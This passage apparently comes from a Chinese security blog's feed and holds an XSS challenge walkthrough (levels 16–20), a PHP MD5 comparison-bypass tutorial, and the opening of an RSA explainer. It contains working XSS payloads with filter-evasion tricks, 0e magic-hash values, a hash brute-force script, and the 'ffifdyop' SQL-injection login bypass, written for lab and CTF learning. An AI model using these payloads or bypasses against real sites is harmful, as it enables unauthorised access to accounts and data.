class="line">?src&#x3D;&#39;level1.php?name&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert()&gt;&#39;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-16">          <a href="#level-16" class="heading-link"><i class="fas fa-link"></i></a>level 16</h3>      <p>查看源码</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/16.1.png"></p><p>输入的东西经过了大小写的转换并且通过四次的替换检查，分别对script，空格，/，进行了替换，但是有一点很重要，尖括号没有被替换，这给我们留下很大的利用空间。</p><p>另外script被替代，我们可以使用img标签，剩下我们就需要考虑如何把空格的影响给去掉，这时候就需要使用url编码来进行绕过了，可以选择<code>%0d</code> <code>%0a</code> （表会回车换行）进行绕过，构造出最后的payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&lt;img%0dsrc&#x3D;1%0donclick&#x3D;alert()&gt;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/16.2.png"></p>        <h3 id="level-17">          <a href="#level-17" class="heading-link"><i class="fas fa-link"></i></a>level 17</h3>      <p>这关做了个寂寞，点击直接进入下一关了</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/17.1.png"></p>        <h3 id="level-18">          <a href="#level-18" class="heading-link"><i class="fas fa-link"></i></a>level 18</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/18.1.png"></p><p>有两个get类型的参数，可以直接构建payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%20onmouseover&#x3D;alert()      &#x2F;&#x2F;%20是空格</span><br><span class="line">或者直接在url后面添加%20onmouseover&#x3D;alert()</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/18.2.png"></p>        <h3 id="level-19">          <a href="#level-19" class="heading-link"><i class="fas fa-link"></i></a>level 19</h3>      <p>查看源码</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.1.png"></p><p>flash xss，需要对flash的反编译对源码进行分析，这里使用<span class="exturl"><a class="exturl__link" href="https://github.com/jindrapetrik/jpexs-decompiler">jpexs-decompiler</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>来分析，首先定位getURL函数</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.2.png"></p><p>然后追踪到sIFR的内容</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.3.png"></p><p>得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL只在内容为link时打开，所以分析contentIsLink函数</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.4.png"></p><p>所以我们可以构造<a> </a> 标签来传值，构建payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;version&amp;arg02&#x3D;&lt;a%20href&#x3D;&quot;javascript:alert()&quot;&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/19.5.png"></p>        <h3 id="level-20">          <a href="#level-20" class="heading-link"><i class="fas fa-link"></i></a>level 20</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/20.1.png"></p><p>将xsf04.swf文件分析得知分析得知是zeroclipboard.swf</p><p>这一题用到了zeroclipboard xss，具体可以参考这篇文章：<br><span class="exturl"><a class="exturl__link" href="https://www.freebuf.com/sectool/108568.html">https://www.freebuf.com/sectool/108568.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>国内广泛使用了zeroclipboard.swf，主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上</p><p>看一下源码：<br>使用jpexs反编译(swf反编译工具：<span class="exturl"><a class="exturl__link" href="https://github.com/jindrapetrik/jpexs-decompiler">https://github.com/jindrapetrik/jpexs-decompiler</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>)<br>原因显而易见，Externalinterface.call第二个参数传回来的id没有正确过滤导致xss</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/20.2.png"></p><p>构建payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;id&amp;arg02&#x3D;\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a&#x3D;!alert(1)&#x2F;&#x2F;%26width%26height</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/20.3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5绕过</title>
      <link href="2020/08/27/MD5%E7%BB%95%E8%BF%87/"/>
      <url>2020/08/27/MD5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="CTF-CTF中if-md5-md5-GET-‘a’-md5-GET-‘b’-的绕过">          <a href="#CTF-CTF中if-md5-md5-GET-‘a’-md5-GET-‘b’-的绕过" class="heading-link"><i class="fas fa-link"></i></a>[CTF]CTF中if (md5(md5($_GET[‘a’])) == md5($_GET[‘b’])) 的绕过</h1>              <h3 id="0X00-摘要">          <a href="#0X00-摘要" class="heading-link"><i class="fas fa-link"></i></a>0X00 摘要</h3>      <p>CTF中md5判等可使用0e绕过，但是如果是双md5该如何绕过呢？本文将教你如何绕过md5(md5($_GET[‘a’])) == md5($_GET[b’])。</p>        <h3 id="0X01-引言">          <a href="#0X01-引言" class="heading-link"><i class="fas fa-link"></i></a>0X01 引言</h3>      <a id="more"></a><p>在php中，所有变量都是若类型的，在使用if判等的时候要格外小心，使用特殊的参数可能会使本来不相等的if判断位相等，比如下面的例子。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123;</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line">if ($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)) &#123;</span><br><span class="line">echo &quot;flag&#123;XXXXX&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &#39;wrong!&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>上面只要传入参数a=s1885207154a，b=s1836677006a，即可，为什么呢？看一下这两个字符串的md5值可以返现分别如下：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MD5值：</span><br><span class="line"></span><br><span class="line">md5(&quot;s1885207154a&quot;) &#x3D;&gt; 0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">md5(&quot;s1836677006a&quot;) &#x3D;&gt; 0e481036490867661113260034900752</span><br></pre></td></tr></table></div></figure><p>二者都是0e开头，在php中0e会被当做科学计数法，就算后面有字母，其结果也是0，所以上面的if判断结果使true，成功绕过！</p>        <h3 id="0x02-双MD5碰撞绕过">          <a href="#0x02-双MD5碰撞绕过" class="heading-link"><i class="fas fa-link"></i></a>0x02 双MD5碰撞绕过</h3>      <p>上面只是小试牛刀，下面看一个升级版：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123;</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line">if ($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5(md5($b)) &#123;</span><br><span class="line">echo &quot;flag&#123;XXXXX&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;wrong!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &#39;wrong!&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure><p>双面的判断出现了md5(md5($b)，有了前面的铺垫，这里我们第一感觉就是找到一个字符串其MD5值的MD5仍然是0e开头的那就好了。开始的时候我不敢相信，那几率得多小啊，但是在昨天做一道md5截断碰撞的时候我就来了灵感，何不尝试一下，结果发现原来这种字符串使真的存在，并且碰撞0e开头的时候不到一秒钟就能碰撞到。各位观众，下面请看：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MD5值：</span><br><span class="line"></span><br><span class="line">md5(&quot;V5VDSHva7fjyJoJ33IQl&quot;) &#x3D;&gt; 0e18bb6e1d5c2e19b63898aeed6b37ea</span><br><span class="line"></span><br><span class="line">md5(&quot;0e18bb6e1************&quot;) &#x3D;&gt; 0e0a710a092113dd5ec9dd47d4d7b86f</span><br></pre></td></tr></table></div></figure><p>原来真的存在0e开头的MD5值其md5结果也是0e开头，所以此题答案便出来了。a=s1885207154a，b=V5VDSHva7fjyJoJ33IQl即可绕过if判断。 </p><p>其实上面的这种双md5值0e开头的字符串有很多，但是网上似乎很见到，几乎没有，下面发布一些： </p>        <h3 id="0x03-双md5结果仍为0e开头字符串大全">          <a href="#0x03-双md5结果仍为0e开头字符串大全" class="heading-link"><i class="fas fa-link"></i></a>0x03 双md5结果仍为0e开头字符串大全</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MD5大全：</span><br><span class="line"></span><br><span class="line">1. CbDLytmyGm2xQyaLNhWn</span><br><span class="line"></span><br><span class="line">md5(CbDLytmyGm2xQyaLNhWn) &#x3D;&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line"></span><br><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) &#x3D;&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line"></span><br><span class="line">2. 770hQgrBOjrcqftrlaZk</span><br><span class="line"></span><br><span class="line">md5(770hQgrBOjrcqftrlaZk) &#x3D;&gt; 0e689b4f703bdc753be7e27b45cb3625</span><br><span class="line"></span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) &#x3D;&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line"></span><br><span class="line">3. 7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line"></span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) &#x3D;&gt; 0e269ab12da27d79a6626d91f34ae849</span><br><span class="line"></span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) &#x3D;&gt; 0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></div></figure>        <h3 id="0x04-MD5碰撞脚本">          <a href="#0x04-MD5碰撞脚本" class="heading-link"><i class="fas fa-link"></i></a>0x04 MD5碰撞脚本</h3>      <p> 授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import multiprocessing</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line">CHARS &#x3D; string.letters + string.digits</span><br><span class="line">def cmp_md5(substr, stop_event, str_len,. start&#x3D;0, size&#x3D;20):</span><br><span class="line">    global CHARS</span><br><span class="line">    while not stop_event.is_set():</span><br><span class="line">        rnds &#x3D; &#39;&#39;.join(random.choice(CHARS) for _ in range(size))</span><br><span class="line">        md5 &#x3D; hashlib.md5(rnds)</span><br><span class="line">        value &#x3D; md5.hexdigest()</span><br><span class="line">        if value[start: start+str_len] &#x3D;&#x3D; substr:</span><br><span class="line">            print rnds</span><br><span class="line">            stop_event.set()</span><br><span class="line">            &#39;&#39;&#39;</span><br><span class="line">            #碰撞双md5</span><br><span class="line">            md5 &#x3D; hashlib.md5(value)</span><br><span class="line">            if md5.hexdigest()[start: start+str_len] &#x3D;&#x3D; substr:</span><br><span class="line">            print rnds+ &quot;&#x3D;&gt;&quot; + value+&quot;&#x3D;&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;</span><br><span class="line">                stop_event.set()</span><br><span class="line">            &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    substr &#x3D; sys.argv[1].strip()</span><br><span class="line">    start_pos &#x3D; int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0</span><br><span class="line">    str_len &#x3D; len(substr)</span><br><span class="line">    cpus &#x3D; multiprocessing.cpu_count()</span><br><span class="line">    stop_event &#x3D; multiprocessing.Event()</span><br><span class="line">    processes &#x3D; [multiprocessing.Process(target&#x3D;cmp_md5, args&#x3D;(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 for i in range(cpus)]</span><br><span class="line">    for p in processes:</span><br><span class="line">        p.start()</span><br><span class="line">    for p in processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></div></figure><p>上面脚本注释部分是双MD5碰撞，取消注释然后注释掉16行即可。</p><p>使用方法：python md5Crack.py “你要碰撞的字符串” 字符串的起始位置</p><p>例如：python md5Crack.py “0e” 0</p><p>将产生MD5值为0e开头的字符串。</p>        <h3 id="0x05-MD5的数组特性">          <a href="#0x05-MD5的数组特性" class="heading-link"><i class="fas fa-link"></i></a>0x05 MD5的数组特性</h3>      <p>使用php中md5的特性来绕过</p><p>md5([1,2]) == md5([3,4]) == NULL</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_GET[&#39;hash2&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !&#x3D;&#x3D; md5($_GET[&#39;hash3&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    die(&#39;level 2 failed&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>传入 hash2[]=1&amp;hash3=[]=2</p>        <h3 id="0x06-MD5-SQL注入绕过">          <a href="#0x06-MD5-SQL注入绕过" class="heading-link"><i class="fas fa-link"></i></a>0x06 MD5+SQL注入绕过</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;SELECT * FROM flag WHERE password &#x3D; &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;</span><br><span class="line">$result &#x3D; $mysqli-&gt;query($query);</span><br><span class="line">$row &#x3D; $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></div></figure><p>sql注入里面的 md，平常绕过一个password</p><p>SELECT * FROM flag WHERE password = ‘ ‘ or 1=1’</p><p>那么 ’ or 后面要接上一个 为 true 的表达式</p><p>SELECT * FROM flag WHERE password = ‘“ . md5($_GET[“hash4”],true) . “‘</p><p>那么目的就明确了   md5($_GET[“hash4”],true)  这里要为 true</p><p>若我们可找到字符串，在对该字符串进行md5后能够得到  ‘or’加上一个非0的字符就可以绕过。这里我们可以用到的字符串为：<strong>ffifdyop</strong>。它的md5结果是：276f722736c95d99e921722cf9ed621c 。通过这个结果我们可以发现得到16字节的二进制被解析为字符的结果是:’or’6后面接乱码  (27是单引号的16进制编码，67是字母o的16进制…)这样后构造的sql语句就位</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop </span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621</span><br><span class="line">craw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#39;or&#39;6]!r,b</span><br></pre></td></tr></table></div></figure><p>所以：hash4=ffifdyop</p>]]></content>
      
      
      <categories>
          
          <category> Misc密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA加密原理详解</title>
      <link href="2020/08/21/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/08/21/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="RSA加密原理详解">          <a href="#RSA加密原理详解" class="heading-link"><i class="fas fa-link"></i></a>RSA加密原理详解</h1>              <h2 id="一、算法介绍">          <a href="#一、算法介绍" class="heading-link"><i class="fas fa-link"></i></a>一、算法介绍</h2>      <p><strong>一、RSA加密简介</strong></p><a id="more"></a><p>　　RSA加密是一种非对称加密。可以在不直接传递密钥的情况下，完成解密。这能够确保信息的安全性，避免了直接传递密钥所造成的被破解的风险。是由一对密钥来进行加解密的过程，分别称为公钥和私钥。两者之间有数学相关，该加密算法的原理就是对一极大整数做因数分解的困难性来保证安全性。通常个人保存私钥，公钥是公开的（可能同时多人持有）。</p><p><strong>二、RSA加密、签名区别</strong></p><p>　　加密和签名都是为了安全性考虑，但略有不同。常有人问加密和签名是用私钥还是公钥？其实都是对加密和签名的作用有所混淆。简单的说，加密是为了防止信息被泄露，而签名是为了防止信息被篡改。这里举2个例子说明。</p><p><strong>第一个场景</strong>：战场上，B要给A传递一条消息，内容为某一指令。</p><p>RSA的加密过程如下：</p><p>（1）A生成一对密钥（公钥和私钥），私钥不公开，A自己保留。公钥为公开的，任何人可以获取。</p><p>（2）A传递自己的公钥给B，B用A的公钥对消息进行加密。</p><p>（3）A接收到B加密的消息，利用A自己的私钥对消息进行解密。</p><p>　　在这个过程中，只有2次传递过程，第一次是A传递公钥给B，第二次是B传递加密消息给A，即使都被敌方截获，也没有危险性，因为只有A的私钥才能对消息进行解密，防止了消息内容的泄露。</p><p><strong>第二个场景：</strong>A收到B发的消息后，需要进行回复“收到”。</p><p>RSA签名的过程如下：</p><p>（1）A生成一对密钥（公钥和私钥），私钥不公开，A自己保留。公钥为公开的，任何人可以获取。</p><p>（2）A用自己的私钥对消息加签，形成签名，并将加签的消息和消息本身一起传递给B。</p><p>（3）B收到消息后，在获取A的公钥进行验签，如果验签出来的内容与消息本身一致，证明消息是A回复的。</p><p>　　在这个过程中，只有2次传递过程，第一次是A传递加签的消息和消息本身给B，第二次是B获取A的公钥，即使都被敌方截获，也没有危险性，因为只有A的私钥才能对消息进行签名，即使知道了消息内容，也无法伪造带签名的回复给B，防止了消息内容的篡改。</p><p>　　但是，综合两个场景你会发现，第一个场景虽然被截获的消息没有泄露，但是可以利用截获的公钥，将假指令进行加密，然后传递给A。第二个场景虽然截获的消息不能被篡改，但是消息的内容可以利用公钥验签来获得，并不能防止泄露。所以在实际应用中，要根据情况使用，也可以同时使用加密和签名，比如A和B都有一套自己的公钥和私钥，当A要给B发送消息时，先用B的公钥对消息加密，再对加密的消息使用A的私钥加签名，达到既不泄露也不被篡改，更能保证消息的安全性。</p><p>　　<strong>总结：公钥加密、私钥解密、私钥签名、公钥验签。</strong></p>        <h2 id="1-什么是RSA">          <a href="#1-什么是RSA" class="heading-link"><i class="fas fa-link"></i></a>1. 什么是RSA</h2>      <p>RSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语<br> 根据密钥的使用方法，可以将密码分为对称密码和公钥密码<br> 对称密码：加密和解密使用同一种密钥的方式<br> 公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。</p>        <h3 id="1-1-互质关系">          <a href="#1-1-互质关系" class="heading-link"><i class="fas fa-link"></i></a>1.1 互质关系</h3>      <p>如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/zh-cn/%E4%BA%92%E7%B4%A0">互质关系</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>（coprime）。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。</p><p>关于互质关系，不难得到以下结论：</p><blockquote><p>　　1. 任意两个质数构成互质关系，比如13和61。</p><p>　　2. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。</p><p>　　3. 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。</p><p>　　4. 1和任意一个自然数是都是互质关系，比如1和99。</p><p>　　5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。</p><p>　　6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</p></blockquote>        <h3 id="1-2-欧拉函数">          <a href="#1-2-欧拉函数" class="heading-link"><i class="fas fa-link"></i></a>1.2 欧拉函数</h3>      <p>请思考以下问题：</p><blockquote><p>任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？）</p></blockquote><p>计算这个值的方法就叫做<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0">欧拉函数</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。</p><p>φ(n) 的计算方法并不复杂，但是为了得到最后那个公式，需要一步步讨论。 </p><p><strong>第一种情况</strong></p><p>如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。</p><p><strong>第二种情况</strong></p><p>如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</p><p><strong>第三种情况</strong></p><p>如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)，则 </p><p>比如 φ(8) = φ(2^3) =2^3 - 2^2 = 8 -4 = 4。</p><p>这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p^(k-1)个，即1×p、2×p、3×p、…、p^(k-1)×p，把它们去除，剩下的就是与n互质的数。</p><p><strong>第四种情况</strong></p><p>如果n可以分解成两个互质的整数之积，</p><blockquote><p>　　n = p1 × p2</p></blockquote><p>则</p><blockquote><p>　　φ(n) = φ(p1p2) = φ(p1)φ(p2)</p></blockquote><p>即积的欧拉函数等于各个因子的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。</p><p>这一条的证明要用到<span class="exturl"><a class="exturl__link" href="http://en.wikipedia.org/wiki/Chinese_remainder_theorem">“中国剩余定理”</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，这里就不展开了，只简单说一下思路：如果a与p1互质(a&lt;p1)，b与p2互质(b&lt;p2)，c与p1p2互质(c&lt;p1p2)，则c与数对 (a,b) 是一一对应关系。由于a的值有φ(p1)种可能，b的值有φ(p2)种可能，则数对 (a,b) 有φ(p1)φ(p2)种可能，而c的值有φ(p1p2)种可能，所以φ(p1p2)就等于φ(p1)φ(p2)。</p><p><strong>第五种情况</strong></p><p>因为任意一个大于1的正整数，都可以写成一系列质数的积。</p>        <h3 id="1-3-欧拉定理">          <a href="#1-3-欧拉定理" class="heading-link"><i class="fas fa-link"></i></a>1.3 欧拉定理</h3>      <p>欧拉函数的用处，在于<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86_(%E6%95%B0%E8%AE%BA)">欧拉定理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。”欧拉定理”指的是：</p><blockquote><p>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：</p></blockquote><p>也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。</p><p>欧拉定理的证明比较复杂，这里就省略了。我们只要记住它的结论就行了。</p><p>欧拉定理可以大大简化某些运算。比如，7和10互质，根据欧拉定理，</p><p>已知 φ(10) 等于4，所以马上得到7的4倍数次方的个位数肯定是1。</p><p>因此，7的任意次方的个位数（例如7的222次方），心算就可以算出来。</p><p>欧拉定理有一个特殊情况。  </p><blockquote><p>假设正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成</p></blockquote><p>这就是著名的<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86">费马小定理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。它是欧拉定理的特例。</p><p>欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。</p>        <h3 id="1-4-模反元素">          <a href="#1-4-模反元素" class="heading-link"><i class="fas fa-link"></i></a>1.4 模反元素</h3>      <p>还剩下最后一个概念：</p><blockquote><p>如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。</p><p>这时，b就叫做a的<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0">“模反元素”</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。</p></blockquote><p>比如，3和11互质，那么3的模反元素就是4，因为 (3 × 4)-1 可以被11整除。显然，模反元素不止一个， 4加减11的整数倍都是3的模反元素 {…,-18,-7,4,15,26,…}，即如果b是a的模反元素，则 b+kn 